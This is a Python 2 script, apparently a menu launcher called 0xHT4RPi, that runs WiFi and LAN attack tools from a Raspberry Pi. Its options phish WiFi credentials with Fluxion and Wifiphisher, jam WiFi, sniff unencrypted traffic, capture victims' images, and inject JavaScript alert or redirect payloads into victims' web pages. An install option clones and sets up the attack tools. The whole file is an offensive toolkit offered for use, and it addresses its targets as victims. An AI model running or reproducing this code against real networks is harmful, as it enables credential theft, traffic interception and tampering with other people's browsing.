#!usr/bin/env python
#coding: utf-8

import os, sys

while True:
    os.system('clear')

    Hello = '''
    ╭━━━╮╱╭╮╭┳━━┳╮╱╭┳━┳━┳╮──▄▀▀▀▄
    ┃╭━╮┣┳┫╰╯┣╮╭┫┃╱┃┃╋┃╋┣┫──█───█
    ┃┃┃┃┣┃┫╭╮┃┃┃┃╰━╯┃╮┫╭┫┃─███████         ▄▀▀▄
    ┃┃┃┃┣┻┻╯╰╯╰╯╰━━╮┣┻┻╯╰╯░███▀███░░█▀█▀▀▀▀█░░█░
    ┃╰━╯┃ 0xHT4RPi ┃┃     ░███▄███░░▀░▀░░░░░▀▀░░
    [!] 0x (\033[1;31mH\033[1;m)acking (\033[1;31mT\033[1;m)ools \033[1;31m4\033[1;m (\033[1;31mR\033[1;m)aspberry (\033[1;31mP\033[1;m)i
    [~] Coded By \033[1;31mAbdullah AlZahrani\033[1;m [0xAbdullah]
    [@] Twitter: \033[1;31m@0xAbdullah\033[1;m | WebSite: \033[1;31m0xA.TECH\033[1;m
    \n'''
    print Hello
    if not os.geteuid() == 0:
        sys.exit("\n\033[1;31m[-] You don't have admin privilegies, execute the script as root.\n[@] sudo python 0xHT4RPi.py\033[1;m")
    List = '''
    1) Hacking WiFi
    2) Jamming WiFi
    3) Sniffing

    [Esc] Press [Q] to exit
    99) Install/Update Tools
    \n'''

    print List
    List = raw_input(" > ")
    HWList = '''
    1) Hacking Wifi With Fluxion [\033[1;31mNeed GUI\033[1;m]
    2) Hacking Wifi With Wifiphisher
    \n'''

    SList = '''
    1) Inject arbitrary Javascript into pages
    2) Capture images [\033[1;31mNeed GUI\033[1;m]
    3) Sniffing non-HTTPS data they send or request
    4) DNS spoofing
    \n'''

    if List == '1':
        print HWList
        HWList = raw_input(" > ")
        if HWList == '1':
            os.system('cd 0xHT4RPi/fluxion && ./fluxion.sh')
        elif HWList == '2':
            os.system('cd 0xHT4RPi/wifiphisher && wifiphisher')
    elif List == '2':
        os.system('cd 0xHT4RPi/wifijammer && sudo python wifijammer.py')
    elif List == '3':
        print SList
        SList = raw_input(" > ")
        if SList == '1':
            ExIndex = '''
    1) Inject alert Box
    2) Inject Your Javascript code
            \n'''
            print ExIndex
            ExIndex = raw_input(' > ')
            if ExIndex == '1':
                Message = raw_input('[W] Write a message to your victim\n > ')
                Alert = "'""<script>alert("'"'+Message+'"'");</script>""'"
                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (Alert))
                os.system(Exploit)
            elif ExIndex == '2':
                HTML = raw_input("[*] Enter Your HTML Code\n > ")
                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (HTML))
                os.system(Exploit)
        elif SList == '2':
            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p -d -i wlan1')
            os.system(Exploit)
        elif SList == '3':
            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p -i wlan1')
            os.system(Exploit)
        elif SList == '4':
            URL = raw_input("[-] Enter URL to redirecting the victim to another Website\n > ")
            Redirecting = "'""<script>window.location.replace("'"'+URL+'"'");</script>""'"
            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (Redirecting))
            os.system(Exploit)
    elif List == '99':
        QInstall = raw_input('[I] Do You Want To Install/Update Tools Y/n \n > ')
        if QInstall == 'y' or QInstall == 'Y':
            print "[I] Please Wait ... Downloading and installing the tools"
            os.system('mkdir 0xHT4RPi && cd 0xHT4RPi && git clone https://github.com/wifiphisher/wifiphisher.git && cd wifiphisher && python setup.py install')
            try:
                os.system('cd 0xHT4RPi && git clone https://github.com/wi-fi-analyzer/fluxion.git && cd fluxion/install && bash install.sh')
            except:
                print "[!] Need GUI to Install Fluxion"
            os.system('cd 0xHT4RPi && git clone https://github.com/DanMcInerney/wifijammer.git')
            os.system('cd 0xHT4RPi && git clone https://github.com/DanMcInerney/LANs.py.git')
            os.system('apt-get install -y network-manager')
            os.system('apt-get install -y python-nfqueue')
            os.system('apt-get install -y python-twisted')
            os.system('apt-get install -y nbtscan')
            os.system('apt-get install -y aircrack-ng')
            os.system('apt-get install -y driftnet')
            os.system('clear')
            print "[!] Done....."
            os.system("sudo python 0xHT4RPi.py")
        else:
            pass
    elif List == 'q' or List == 'Q':
        break
